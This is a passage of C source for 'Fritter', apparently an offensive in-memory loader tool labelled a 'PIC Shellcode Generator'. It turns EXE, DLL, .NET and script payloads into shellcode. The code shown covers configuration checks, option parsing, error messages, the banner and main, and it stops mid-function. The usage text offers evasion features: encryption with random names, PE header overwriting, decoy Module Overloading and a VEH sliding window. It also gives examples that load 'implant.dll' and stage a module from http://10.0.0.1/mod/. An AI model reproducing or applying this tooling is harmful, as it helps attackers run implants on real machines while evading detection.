    if(c->inst_type == FRITTER_INSTANCE_HTTP) {
      // no URL? exit
      if(c->server[0] == 0) {
        DPRINT("Error: No HTTP server provided.");
        return FRITTER_ERROR_INVALID_PARAMETER;
      }
      // doesn't begin with one of the following? exit
      if((strnicmp(c->server, "http://",  7) != 0) &&
         (strnicmp(c->server, "https://", 8) != 0)) {
        
        DPRINT("URL is invalid : %s", c->server);
        return FRITTER_ERROR_INVALID_URL;
      }
      // invalid length?
      url_len = (uint32_t)strlen(c->server);
      
      if(url_len <= 8) {
        DPRINT("URL length : %" PRId32 " is invalid.", url_len);
        return FRITTER_ERROR_URL_LENGTH;
      }
      // if the end of string doesn't have a forward slash
      // add one more to account for it
      if(c->server[url_len - 1] != '/') {
        c->server[url_len] = '/';
        url_len++;
      }
      
      if((url_len + FRITTER_MAX_MODNAME) >= FRITTER_MAX_NAME) {
        DPRINT("URL length : %" PRId32 " exceeds size of buffer : %"PRId32, 
          url_len+FRITTER_MAX_MODNAME, FRITTER_MAX_NAME);
        return FRITTER_ERROR_URL_LENGTH;
      }
    }
    
    if(c->arch != FRITTER_ARCH_X64)
    {
      DPRINT("Only x64 architecture is supported. Got %"PRId32, c->arch);
      return FRITTER_ERROR_INVALID_ARCH;
    }
    
    if(c->headers != FRITTER_HEADERS_OVERWRITE     &&
       c->headers != FRITTER_HEADERS_KEEP)
    {
      DPRINT("Option to preserve PE headers (or not) %"PRId32" is invalid.", c->headers);
      return FRITTER_ERROR_HEADERS_INVALID;
    }
    
    DPRINT("Loader configuration passed validation.");
    return FRITTER_ERROR_OK;
}

/**
 * Function: is_dll_export
 * ----------------------------
 *   Validates if a DLL exports a function. 
 *
 *   INPUT  : Name of DLL function to check.
 *
 *   OUTPUT : 1 if found, else 0
 */
static int is_dll_export(const char *function) {
    PIMAGE_DATA_DIRECTORY   dir;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD                   rva, cnt;
    ULONG64                 ofs;
    PDWORD                  sym;
    PCHAR                   str;
    int                     found = 0;

    DPRINT("Entering.");
    
    dir = Dirs(fi.data);
    if(dir != NULL) {
      rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
      DPRINT("EAT VA : %lx", rva);
      if(rva != 0) {
        ofs = rva2ofs(fi.data, rva);
        DPRINT("Offset = %" PRIX64 "\n", ofs);
        if(ofs != -1) {
          exp = (PIMAGE_EXPORT_DIRECTORY)(fi.data + ofs);
          cnt = exp->NumberOfNames;
          DPRINT("Number of exported functions : %lx", cnt);
          
          if(cnt != 0) {
            sym = (PDWORD)(rva2ofs(fi.data, exp->AddressOfNames) + fi.data);
            // scan array for symbol
            do {
              str = (PCHAR)(rva2ofs(fi.data, sym[cnt - 1]) + fi.data);
              // if match found, exit
              if(strcmp(str, function) == 0) {
                DPRINT("Found API");
                found = 1;
                break;
              }
            } while (--cnt);
          }
        }
      }
    }
    DPRINT("Leaving.");
    return found;
}

/**
 * Function: validate_file_cfg
 * ----------------------------
 *   Validates configuration for the input file.
 *
 *   INPUT  : Pointer to Fritter configuration.
 *
 *   OUTPUT : Fritter error code. 
 */
static int validate_file_cfg(PFRITTER_CONFIG c) {
    DPRINT("Validating configuration for input file.");
    
    // Unmanaged EXE/DLL?
    if(fi.type == FRITTER_MODULE_DLL ||
       fi.type == FRITTER_MODULE_EXE)
    {
      // Only x64 binaries supported
      if(fi.arch != FRITTER_ARCH_X64) {
        DPRINT("Only x64 binaries are supported. File arch: %"PRId32, fi.arch);
        return FRITTER_ERROR_ARCH_MISMATCH;
      }
      // DLL function specified. Does it exist?
      if(fi.type == FRITTER_MODULE_DLL && c->method[0] != 0)
      {
        if(!is_dll_export(c->method)) {
          DPRINT("Unable to locate function \"%s\" in DLL", c->method);
          return FRITTER_ERROR_DLL_FUNCTION;
        }
      }
    }    
    // .NET DLL assembly?
    if(fi.type == FRITTER_MODULE_NET_DLL) {
      // DLL requires class and method
      if(c->cls[0] == 0 || c->method[0] == 0) {
        DPRINT("Input file is a .NET assembly, but no class and method have been specified.");
        return FRITTER_ERROR_NET_PARAMS;
      }
    }
    
    // is this an unmanaged DLL with parameters?
    if(fi.type == FRITTER_MODULE_DLL && c->args[0] != 0) {
      // we need a DLL function
      if(c->method[0] == 0) {
        DPRINT("Parameters are provided for an unmanaged/native DLL, but no function.");
        return FRITTER_ERROR_DLL_PARAM;
      }
    }
    DPRINT("Validation passed.");
    return FRITTER_ERROR_OK;
}

/**
 * Function: FritterCreate
 * ----------------------------
 *   Builds a position-independent loader for VBS/JS/EXE/DLL files.
 *
 *   INPUT  : Pointer to a Fritter configuration.
 *
 *   OUTPUT : Fritter error code.
 */
EXPORT_FUNC 
int FritterCreate(PFRITTER_CONFIG c) {
    int err = FRITTER_ERROR_OK;
    
    DPRINT("Entering.");
    
    c->mod = c->pic = c->inst = NULL;
    c->mod_len = c->pic_len = c->inst_len = 0;
    
    // 1. validate the loader configuration
    err = validate_loader_cfg(c);
    if(err == FRITTER_ERROR_OK) {
      // 2. get information about the file to execute in memory
      err = read_file_info(c);
      if(err == FRITTER_ERROR_OK) {
        // 3. validate the module configuration
        err = validate_file_cfg(c);
        if(err == FRITTER_ERROR_OK) {
          // 4. build the module
          err = build_module(c);
          if(err == FRITTER_ERROR_OK) {
            // 5. build the instance
            err = build_instance(c);
            if(err == FRITTER_ERROR_OK) {
              // 6. build the loader
              err = build_loader(c);
              if(err == FRITTER_ERROR_OK) {
                if(err == FRITTER_ERROR_OK) {
                  // 7. save loader and any additional files to disk
                  err = save_loader(c);
                }
              }
            }
          }
        }
      }
    }
    // if there was some error, release resources
    if(err != FRITTER_ERROR_OK) {
      FritterDelete(c);
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: FritterDelete
 * ----------------------------
 *   Releases memory allocated by internal Fritter functions.
 *
 *   INPUT  : Pointer to a Fritter configuration previously used by FritterCreate.
 *
 *   OUTPUT : Fritter error code.
 */
EXPORT_FUNC 
int FritterDelete(PFRITTER_CONFIG c) {
    
    DPRINT("Entering.");
    if(c == NULL) {
      return FRITTER_ERROR_INVALID_PARAMETER;
    }
    // free module
    if(c->mod != NULL) {
      DPRINT("Releasing memory for module.");
      free(c->mod);
      c->mod = NULL;
    }
    // free instance
    if(c->inst != NULL) {
      DPRINT("Releasing memory for configuration.");
      free(c->inst);
      c->inst = NULL;
    }
    // free loader
    if(c->pic != NULL) {
      DPRINT("Releasing memory for loader.");
      free(c->pic);
      c->pic = NULL;
    }
    unmap_file();
    
    DPRINT("Leaving.");
    return FRITTER_ERROR_OK;
}

/**
 * Function: FritterError
 * ----------------------------
 *   Converts Fritter error code into a string
 *
 *   INPUT  : error code returned by FritterCreate
 *
 *   OUTPUT : error code as a string 
 */
EXPORT_FUNC
const char *FritterError(int err) {
    static const char *str="N/A";
    
    switch(err) {
      case FRITTER_ERROR_OK:
        str = "No error.";
        break;
      case FRITTER_ERROR_FILE_NOT_FOUND:
        str = "File not found.";
        break;
      case FRITTER_ERROR_FILE_EMPTY:
        str = "File is empty.";
        break;
      case FRITTER_ERROR_FILE_ACCESS:
        str = "Cannot open file.";
        break;
      case FRITTER_ERROR_FILE_INVALID:
        str = "File is invalid.";
        break;      
      case FRITTER_ERROR_NET_PARAMS:
        str = "File is a .NET DLL. Fritter requires a class and method.";
        break;
      case FRITTER_ERROR_NO_MEMORY:
        str = "Memory allocation failed.";
        break;
      case FRITTER_ERROR_INVALID_ARCH:
        str = "Invalid architecture specified.";
        break;      
      case FRITTER_ERROR_INVALID_URL:
        str = "Invalid URL.";
        break;
      case FRITTER_ERROR_URL_LENGTH:
        str = "Invalid URL length.";
        break;
      case FRITTER_ERROR_INVALID_PARAMETER:
        str = "Invalid parameter.";
        break;
      case FRITTER_ERROR_RANDOM:
        str = "Error generating random values.";
        break;
      case FRITTER_ERROR_DLL_FUNCTION:
        str = "Unable to locate DLL function provided. Names are case sensitive.";
        break;
      case FRITTER_ERROR_ARCH_MISMATCH:
        str = "Target architecture cannot support selected DLL/EXE file.";
        break;
      case FRITTER_ERROR_DLL_PARAM:
        str = "You've supplied parameters for an unmanaged DLL. Fritter also requires a DLL function.";
        break;
      case FRITTER_ERROR_HEADERS_INVALID:
        str = "Invalid PE headers preservation option.";
        break;
      case FRITTER_ERROR_INVALID_FORMAT:
        str = "The output format is invalid.";
        break;
      case FRITTER_ERROR_INVALID_ENGINE:
        str = "The compression engine is invalid.";
        break;
      case FRITTER_ERROR_COMPRESSION:
        str = "There was an error during compression.";
        break;
      case FRITTER_ERROR_INVALID_ENTROPY:
        str = "Invalid entropy level specified.";
        break;
      case FRITTER_ERROR_MIXED_ASSEMBLY:
        str = "Mixed (native and managed) assemblies are currently unsupported.";
        break;
      case FRITTER_ERROR_DECOY_INVALID:
        str = "Path of decoy module is invalid.";
        break;
    }
    DPRINT("Error result : %s", str);
    return str;
}

#ifdef FRITTER_EXE

#define OPT_MAX_STRING 256

#define OPT_TYPE_NONE   1
#define OPT_TYPE_STRING 2
#define OPT_TYPE_DEC    3
#define OPT_TYPE_HEX    4
#define OPT_TYPE_FLAG   5
#define OPT_TYPE_DEC64  6
#define OPT_TYPE_HEX64  7

// structure to hold data of any type
typedef union _opt_arg_t {
    int flag;

    int8_t s8;
    uint8_t u8;
    int8_t *s8_ptr;
    uint8_t *u8_ptr;

    int16_t s16;
    uint16_t u16;
    int16_t *s16_ptr;
    uint16_t *u16_ptr;

    int32_t s32;
    uint32_t u32;
    int32_t *s32_ptr;
    uint32_t *u32_ptr;

    int64_t s64;
    uint64_t u64;
    int64_t *s64_ptr;
    uint64_t *u64_ptr;      

    void *ptr;
    char str[OPT_MAX_STRING+1];
} opt_arg;

typedef void (*void_callback_t)(void);         // execute callback with no return value or argument
typedef int (*arg_callback_t)(opt_arg*,void*); // process argument, optionally store in optarg

static int get_opt(
  int argc,         // total number of elements in argv
  char *argv[],     // argument array
  int arg_type,     // type of argument expected (none, flag, decimal, hexadecimal, string)
  void *output,     // pointer to variable that stores argument
  char *short_opt,  // short form of option. e.g: -a
  char *long_opt,   // long form of option. e.g: --arch
  void *callback)   // callback function to process argument
{
    int  valid = 0, i, req = 0, opt_len, opt_type;
    char *args=NULL, *opt=NULL, *arg=NULL, *tmp=NULL;
    opt_arg *optarg = (opt_arg*)output;
    void_callback_t void_cb;
    arg_callback_t  arg_cb;
    
    // perform some basic validation
    if(argc <= 1) return 0;
    if(argv == NULL) return 0;
    
    if(arg_type != OPT_TYPE_NONE   &&
       arg_type != OPT_TYPE_STRING &&
       arg_type != OPT_TYPE_DEC    &&
       arg_type != OPT_TYPE_HEX    &&
       arg_type != OPT_TYPE_FLAG) return 0;
    
    DPRINT("Arg type for %s, %s : %s",
      short_opt != NULL ? short_opt : "N/A",
      long_opt != NULL ? long_opt : "N/A",
      arg_type == OPT_TYPE_NONE ? "None" : 
      arg_type == OPT_TYPE_STRING ? "String" :
      arg_type == OPT_TYPE_DEC ? "Decimal" :
      arg_type == OPT_TYPE_HEX ? "Hexadecimal" :
      arg_type == OPT_TYPE_FLAG ? "Flag" : "Unknown");
      
    // for each argument in array
    for(i=1; i<argc && !valid; i++) {
      // set the current argument to examine
      arg = argv[i];
      // if it doesn't contain a switch, skip it
      if(*arg != '-') continue;
      // we have a switch. initially, we assume short form
      arg++;
      opt_type = 0;
      // long form? skip one more and change the option type
      if(*arg == '-') {
        arg++;
        opt_type++;
      }
      
      // is an argument required by the user?
      req = ((arg_type != OPT_TYPE_NONE) && (arg_type != OPT_TYPE_FLAG));
      // use short or long form for current argument being examined
      opt = (opt_type) ? long_opt : short_opt;
      // if no form provided by user for current argument, skip it
      if(opt == NULL) continue;
      // copy string to dynamic buffer
      opt_len = strlen(opt);
      if(opt_len == 0) continue;
      
      tmp = calloc(sizeof(uint8_t), opt_len + 1);
      if(tmp == NULL) {
        DPRINT("Unable to allocate memory for %s.\n", opt);
        continue;
      } else {
        strcpy(tmp, opt);
      }
      // tokenize the string.
      opt = strtok(tmp, ";");
      // while we have options
      while(opt != NULL && !valid) {
        // get the length
        opt_len = strlen(opt);
        // do we have a match?   
        if(!strncmp(opt, arg, opt_len)) {
          //
          // at this point, we have a valid matching argument
          // if something fails from here on in, return invalid
          // 
          // skip the option
          arg += opt_len;
          // an argument is *not* required
          if(!req) {
            // so is the next byte non-zero? return invalid
            if(*arg != 0) return 0;
          } else {
            // an argument is required
            // if the next byte is a colon or assignment operator, skip it.
            if(*arg == ':' || *arg == '=') arg++;
         
            // if the next byte is zero
            if(*arg == 0) { 
              // and no arguments left. return invalid
              if((i + 1) >= argc) return 0;
              args = argv[i + 1];
            } else {
              args = arg;
            }
          }
          // end loop
          valid = 1;
          break;
        }
        opt = strtok(NULL, ";");
      }
      if(tmp != NULL) free(tmp);
    }
    
    // if valid option found
    if(valid) {
      DPRINT("Found match");
      // ..and a callback exists
      if(callback != NULL) {
        // if we have a parameter
        if(args != NULL) {
          DPRINT("Executing callback with %s.", args);
          // execute with parameter
          arg_cb = (arg_callback_t)callback;
          arg_cb(optarg, args);
        } else {
          DPRINT("Executing callback.");
          // otherwise, execute without
          void_cb = (void_callback_t)callback;
          void_cb();
        }
      } else {
        // there's no callback, try process ourselves
        if(args != NULL) {
          DPRINT("Parsing %s\n", args);
          switch(arg_type) {
            case OPT_TYPE_DEC:
            case OPT_TYPE_HEX:
              DPRINT("Converting %s to 32-bit binary", args);
              optarg->u32 = strtoul(args, NULL, arg_type == OPT_TYPE_DEC ? 10 : 16);
              break;
            case OPT_TYPE_DEC64:
            case OPT_TYPE_HEX64:
              DPRINT("Converting %s to 64-bit binary", args);
              optarg->u64 = strtoull(args, NULL, arg_type == OPT_TYPE_DEC64 ? 10 : 16);
              break;
            case OPT_TYPE_STRING:
              DPRINT("Copying %s to output", args);
              strncpy(optarg->str, args, OPT_MAX_STRING);
              break;
          }
        } else {
          // there's no argument, just set the flag
          DPRINT("Setting flag");
          optarg->flag = 1;
        }
      }
    }
    // return result
    return valid;
}

static int validate_exit(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    if(strlen(str) == 1 && isdigit((int)*str)) {
      arg->u32 = atoi(str);
    } else {
      if(!strcasecmp("thread", str)) {
        arg->u32 = FRITTER_OPT_EXIT_THREAD;
      } else
      if(!strcasecmp("process", str)) {
        arg->u32 = FRITTER_OPT_EXIT_PROCESS;
      }
      if(!strcasecmp("block", str)) {
        arg->u32 = FRITTER_OPT_EXIT_BLOCK;
      }
    }
    
    switch(arg->u32) {
      case FRITTER_OPT_EXIT_THREAD:
      case FRITTER_OPT_EXIT_PROCESS:
      case FRITTER_OPT_EXIT_BLOCK:
        break;
      default: {
        printf("WARNING: Invalid exit option specified: %"PRId32" -- setting to thread\n", arg->u32);
        arg->u32 = FRITTER_OPT_EXIT_THREAD;
      }
    }
    return 1;
}
 
static int validate_entropy(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) {
      DPRINT("NULL argument.");
      return 0;
    }
    if(strlen(str) == 1 && isdigit((int)*str)) {
      DPRINT("Converting %s to number.", str);
      arg->u32 = strtoul(str, NULL, 10);
    } else {
      if(!strcasecmp("none", str)) {
        arg->u32 = FRITTER_ENTROPY_NONE;
      } else
      if(!strcasecmp("low", str)) {
        arg->u32 = FRITTER_ENTROPY_RANDOM;
      } else
      if(!strcasecmp("full", str)) {
        arg->u32 = FRITTER_ENTROPY_DEFAULT;
      }
    }
    
    // validate
    switch(arg->u32) {
      case FRITTER_ENTROPY_NONE:
      case FRITTER_ENTROPY_RANDOM:
      case FRITTER_ENTROPY_DEFAULT:
        break;
      default: {
        printf("WARNING: Invalid entropy option specified: %"PRId32" -- setting to default\n", arg->u32);
        arg->u32 = FRITTER_ENTROPY_DEFAULT;
      }
    }
    return 1;
}

// callback to validate format
static int validate_format(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    // if it's a single digit, return it as binary
    if(strlen(str) == 1 && isdigit((int)*str)) {
      arg->u32 = atoi(str);
    } else {
      // otherwise, try map it to digit
      if(!strcasecmp("bin", str)) {
        arg->u32 = FRITTER_FORMAT_BINARY;
      } else
      if(!strcasecmp("base64", str)) {
        arg->u32 = FRITTER_FORMAT_BASE64;
      } else
      if(!strcasecmp("c", str)) {
        arg->u32 = FRITTER_FORMAT_C;
      } else 
      if(!strcasecmp("rb", str) || !strcasecmp("ruby", str)) {
        arg->u32 = FRITTER_FORMAT_RUBY;
      } else
      if(!strcasecmp("py", str) || !strcasecmp("python", str)) {
        arg->u32 = FRITTER_FORMAT_PYTHON;
      } else
      if(!strcasecmp("ps", str) || !strcasecmp("powershell", str)) {
        arg->u32 = FRITTER_FORMAT_POWERSHELL;
      } else
      if(!strcasecmp("cs", str) || !strcasecmp("csharp", str)) {
        arg->u32 = FRITTER_FORMAT_CSHARP;
      } else
      if(!strcasecmp("hex", str)) {
        arg->u32 = FRITTER_FORMAT_HEX;
      }
    }
    // validate
    switch(arg->u32) {
      case FRITTER_FORMAT_BINARY:
      case FRITTER_FORMAT_BASE64:
      case FRITTER_FORMAT_C:
      case FRITTER_FORMAT_RUBY:
      case FRITTER_FORMAT_PYTHON:
      case FRITTER_FORMAT_POWERSHELL:
      case FRITTER_FORMAT_CSHARP:
      case FRITTER_FORMAT_HEX:
        break;
      default: {
        printf("WARNING: Invalid format specified: %"PRId32" -- setting to binary.\n", arg->u32);
        arg->u32 = FRITTER_FORMAT_BINARY;
      }
    }
    return 1;
}

// calback to validate headers options
static int validate_headers(opt_arg *arg, void *args) {
    char *str = (char*)args;
    
    arg->u32 = 0;
    if(str == NULL) return 0;
    
    // just temporary
    arg->u32 = atoi(str);
    
    return 1;
}

// ANSI color codes
#define C_RST   "\033[0m"
#define C_BOLD  "\033[1m"
#define C_DIM   "\033[2m"
#define C_RED   "\033[91m"
#define C_GRN   "\033[92m"
#define C_YEL   "\033[93m"
#define C_BLU   "\033[94m"
#define C_DBLU  "\033[34m"
#define C_MAG   "\033[95m"
#define C_CYN   "\033[96m"
#define C_WHT   "\033[97m"

static int g_color = 0; // whether ANSI colors are supported

static void enable_ansi(void) {
#if defined(_WIN32) || defined(_WIN64)
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0;
    if(hOut != INVALID_HANDLE_VALUE && GetConsoleMode(hOut, &mode)) {
        if(SetConsoleMode(hOut, mode | 0x0004 /*ENABLE_VIRTUAL_TERMINAL_PROCESSING*/)) {
            g_color = 1;
        }
    }
    SetConsoleOutputCP(65001); // UTF-8 for Unicode banner
#else
    // assume terminal supports ANSI on unix
    if(isatty(fileno(stdout))) g_color = 1;
#endif
}

// color-aware printf helpers
#define cprintf(color, fmt, ...) do { \
    if(g_color) printf(color fmt C_RST, ##__VA_ARGS__); \
    else printf(fmt, ##__VA_ARGS__); \
} while(0)

static void print_banner(void) {
    printf("\n");
    if(g_color) {
        printf(C_CYN C_BOLD);
        printf("      ______     _ __  __\n");
        printf("     / ____/____(_) /_/ /____  _____\n");
        printf("    / /_  / ___/ / __/ __/ _ \\/ ___/\n");
        printf("   / __/ / /  / / /_/ /_/  __/ /\n");
        printf("  /_/   /_/  /_/\\__/\\__/\\___/_/" C_RST "\n");
    } else {
        printf("      ______     _ __  __\n");
        printf("     / ____/____(_) /_/ /____  _____\n");
        printf("    / /_  / ___/ / __/ __/ _ \\/ ___/\n");
        printf("   / __/ / /  / / /_/ /_/  __/ /\n");
        printf("  /_/   /_/  /_/\\__/\\__/\\___/_/\n");
    }
    printf("\n");
    if(g_color) {
        printf(C_DIM "  PIC Shellcode Generator | x64\n");
        printf("  Built " __DATE__ " " __TIME__ C_RST "\n");
    } else {
        printf("  PIC Shellcode Generator | x64\n");
        printf("  Built " __DATE__ " " __TIME__ "\n");
    }
    printf("\n");
}

static void usage (void) {
    if(g_color) {
        printf(C_WHT C_BOLD "  USAGE" C_RST C_DIM ":  " C_RST "fritter " C_CYN "[options]" C_RST " -i <EXE/DLL/VBS/JS>\n\n");

        printf(C_YEL "  INPUT" C_RST "\n");
        printf("    -i, --input  <path>       " C_DIM "Input file to execute in-memory" C_RST "\n");
        printf("    -p, --args   <args>       " C_DIM "Parameters / command line for target" C_RST "\n");
        printf("    -c, --class  <name>       " C_DIM "Class name (required for .NET DLL)" C_RST "\n");
        printf("    -m, --method <name>       " C_DIM "Method or function for DLL" C_RST "\n");
        printf("    -r, --runtime <ver>       " C_DIM "CLR runtime version" C_RST "\n");
        printf("    -w, --unicode             " C_DIM "Pass command line as UNICODE" C_RST "\n");
        printf("    -t, --thread              " C_DIM "Run unmanaged EXE entrypoint as thread" C_RST "\n\n");

        printf(C_YEL "  OUTPUT" C_RST "\n");
        printf("    -o, --output <path>       " C_DIM "Output file (default: loader.bin)" C_RST "\n");
        printf("    -f, --format <1-8>        " C_DIM "1=Bin 2=B64 3=C 4=Ruby 5=Py 6=PS 7=C# 8=Hex" C_RST "\n");
        printf("    -x, --exit   <1-3>        " C_DIM "1=Thread (default) 2=Process 3=Block" C_RST "\n");
        printf("    -y, --fork   <offset>     " C_DIM "Fork thread, continue at RVA offset" C_RST "\n\n");

        printf(C_YEL "  LOADER" C_RST "\n");
        printf("    -e, --entropy <1-3>       " C_DIM "1=None 2=Random names 3=Names+Crypto (default)" C_RST "\n");
        printf("    -k, --headers <1-2>       " C_DIM "1=Overwrite (default) 2=Keep all" C_RST "\n");
        printf("    -d, --domain  <name>      " C_DIM "AppDomain name for .NET" C_RST "\n");
        printf("    -j, --decoy   <path>      " C_DIM "Decoy module for Module Overloading" C_RST "\n");
        printf("    -g, --chunked <0-1>       " C_DIM "0=RW->RX  1=VEH sliding window (default)" C_RST "\n\n");

        printf(C_YEL "  STAGING" C_RST "\n");
        printf("    -n, --modname <name>      " C_DIM "Module name for HTTP staging" C_RST "\n");
        printf("    -s, --server  <url>       " C_DIM "Server URL (supports basic auth)" C_RST "\n\n");

        printf(C_WHT C_BOLD "  EXAMPLES" C_RST "\n");
        printf(C_DIM "    fritter -i payload.exe\n");
        printf("    fritter -i implant.dll -m RunMain -p \"arg1 arg2\"\n");
        printf("    fritter -i loader.dll -c TestClass -m Run -s http://10.0.0.1/mod/" C_RST "\n");
    } else {
        printf("  USAGE:  fritter [options] -i <EXE/DLL/VBS/JS>\n\n");

        printf("  INPUT\n");
        printf("    -i, --input  <path>       Input file to execute in-memory\n");
        printf("    -p, --args   <args>       Parameters / command line for target\n");
        printf("    -c, --class  <name>       Class name (required for .NET DLL)\n");
        printf("    -m, --method <name>       Method or function for DLL\n");
        printf("    -r, --runtime <ver>       CLR runtime version\n");
        printf("    -w, --unicode             Pass command line as UNICODE\n");
        printf("    -t, --thread              Run unmanaged EXE entrypoint as thread\n\n");

        printf("  OUTPUT\n");
        printf("    -o, --output <path>       Output file (default: loader.bin)\n");
        printf("    -f, --format <1-8>        1=Bin 2=B64 3=C 4=Ruby 5=Py 6=PS 7=C# 8=Hex\n");
        printf("    -x, --exit   <1-3>        1=Thread (default) 2=Process 3=Block\n");
        printf("    -y, --fork   <offset>     Fork thread, continue at RVA offset\n\n");

        printf("  LOADER\n");
        printf("    -e, --entropy <1-3>       1=None 2=Random names 3=Names+Crypto (default)\n");
        printf("    -k, --headers <1-2>       1=Overwrite (default) 2=Keep all\n");
        printf("    -d, --domain  <name>      AppDomain name for .NET\n");
        printf("    -j, --decoy   <path>      Decoy module for Module Overloading\n");
        printf("    -g, --chunked <0-1>       0=RW->RX  1=VEH sliding window (default)\n\n");

        printf("  STAGING\n");
        printf("    -n, --modname <name>      Module name for HTTP staging\n");
        printf("    -s, --server  <url>       Server URL (supports basic auth)\n\n");

        printf("  EXAMPLES\n");
        printf("    fritter -i payload.exe\n");
        printf("    fritter -i implant.dll -m RunMain -p \"arg1 arg2\"\n");
        printf("    fritter -i loader.dll -c TestClass -m Run -s http://10.0.0.1/mod/\n");
    }
    printf("\n");
    exit (0);
}

int main(int argc, char *argv[]) {
    FRITTER_CONFIG c;
    int          err;
    char         *mod_type;
    char         *arch_str = "amd64";
    char         *inst_type[2]= { "Embedded", "HTTP" };

    enable_ansi();
    print_banner();
    
    // zero initialize configuration
    memset(&c, 0, sizeof(c));
    
    // default settings
    c.inst_type = FRITTER_INSTANCE_EMBED;   // file is embedded
    c.arch      = FRITTER_ARCH_X64;         // x64 only
    c.headers   = FRITTER_HEADERS_OVERWRITE;// overwrites PE headers
    c.format    = FRITTER_FORMAT_BINARY;    // default output format
    c.entropy   = FRITTER_ENTROPY_DEFAULT;  // enable random names + symmetric encryption by default
    c.exit_opt  = FRITTER_OPT_EXIT_THREAD;  // default behaviour is to exit the thread
    c.unicode   = 0;                      // command line will not be converted to unicode for unmanaged DLL function
    c.chunked   = 1;                      // VEH sliding window (1) or simple RW->RX (0)
    
    // get options
    get_opt(argc, argv, OPT_TYPE_NONE,   NULL,       "h;?", "help",            usage);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.headers, "k",   "headers",         validate_headers);
    get_opt(argc, argv, OPT_TYPE_STRING, c.cls,      "c",   "class",           NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.domain,   "d",   "domain",          NULL);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.entropy, "e",   "entropy",         validate_entropy);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.format,  "f",   "format",          validate_format);
    get_opt(argc, argv, OPT_TYPE_STRING, c.input,    "i",   "input;file",      NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.method,   "m",   "method;function", NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.modname,  "n",   "modname",         NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.decoy,    "j",   "decoy",           NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.output,   "o",   "output",          NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.args,     "p",   "params;args",     NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.runtime,  "r",   "runtime",         NULL);
    get_opt(argc, argv, OPT_TYPE_STRING, c.server,   "s",   "server",          NULL);
    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.thread,  "t",   "thread",          NULL);
    get_opt(argc, argv, OPT_TYPE_FLAG,   &c.unicode, "w",   "unicode",         NULL);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.exit_opt,"x",   "exit",            validate_exit);
    get_opt(argc, argv, OPT_TYPE_HEX,    &c.oep,     "y",   "oep;fork",        NULL);
    get_opt(argc, argv, OPT_TYPE_DEC,    &c.chunked, "g",   "chunked",         NULL);
    // no file? show usage and exit
    if(c.input[0] == 0) {
      usage();
    }
    
    // server specified?
    if(c.server[0] != 0) {
      c.inst_type = FRITTER_INSTANCE_HTTP;
    }
    
    // generate loader from configuration
    err = FritterCreate(&c);

    if(err != FRITTER_ERROR_OK) {
      if(g_color) printf(C_RED C_BOLD "  ERROR" C_RST " %s\n", FritterError(err));
      else printf("  ERROR: %s\n", FritterError(err));
      return 0;
    }
    
    switch(c.mod_type) {
      case FRITTER_MODULE_DLL:
        mod_type = "DLL";
        break;
      case FRITTER_MODULE_EXE:
        mod_type = "EXE";
        break;
      case FRITTER_MODULE_NET_DLL:
        mod_type = ".NET DLL";
        break;
      case FRITTER_MODULE_NET_EXE:
        mod_type = ".NET EXE";
        break;
      case FRITTER_MODULE_VBS:
        mod_type = "VBScript";
        break;
      case FRITTER_MODULE_JS:
        mod_type = "JScript";
        break;
      default:
        mod_type = "Unrecognized";
        break;
    }
    
    // -- result display --
    {
      const char *entropy_str =
        c.entropy == FRITTER_ENTROPY_NONE   ? "None" :
        c.entropy == FRITTER_ENTROPY_RANDOM ? "Random names" : "Random names + Encryption";
      const char *headers_str =
        c.headers == FRITTER_HEADERS_OVERWRITE ? "Overwrite" :
        c.headers == FRITTER_HEADERS_KEEP      ? "Keep all"  : "Undefined";
      const char *exit_str =
        c.exit_opt == FRITTER_OPT_EXIT_THREAD  ? "Thread" :
        c.exit_opt == FRITTER_OPT_EXIT_PROCESS ? "Process" :
        c.exit_opt == FRITTER_OPT_EXIT_BLOCK   ? "Block"   : "Undefined";

      if(g_color) {
        printf(C_GRN C_BOLD "  SUCCESS" C_RST " Shellcode generated.\n\n");

        printf(C_YEL "  INPUT" C_RST "\n");
        printf("    File        " C_WHT "%s" C_RST "\n", c.input);
        printf("    Type        " C_WHT "%s" C_RST "\n", mod_type);
        printf("    Compressed  " C_WHT "aPLib" C_DIM " (-%"PRId32"%%)" C_RST "\n", file_diff(c.zlen, c.len));
        if(c.mod_type == FRITTER_MODULE_NET_DLL) {
          printf("    Class       " C_WHT "%s" C_RST "\n", c.cls);
          printf("    Method      " C_WHT "%s" C_RST "\n", c.method);
          printf("    Domain      " C_WHT "%s" C_RST "\n", c.domain[0] ? c.domain : "Default");
        } else if(c.mod_type == FRITTER_MODULE_DLL) {
          printf("    Function    " C_WHT "%s" C_RST "\n", c.method[0] ? c.method : "DllMain");
        }
        if(c.args[0]) printf("    Arguments   " C_WHT "%s" C_RST "\n", c.args);
        printf("\n");

        printf(C_YEL "  OUTPUT" C_RST "\n");
        printf("    Shellcode   " C_WHT C_BOLD "%s" C_RST "\n", c.output);
        printf("    Instance    " C_WHT "%s" C_RST "\n", inst_type[c.inst_type - 1]);
        printf("    Arch        " C_WHT "%s" C_RST "\n", arch_str);
        printf("    Exit        " C_WHT "%s" C_RST "\n", exit_str);
        if(c.oep) printf("    OEP         " C_WHT "0x%"PRIX32 C_RST "\n", c.oep);
        if(c.inst_type == FRITTER_INSTANCE_HTTP) {
          printf("    Module      " C_WHT "%s" C_RST "\n", c.modname);
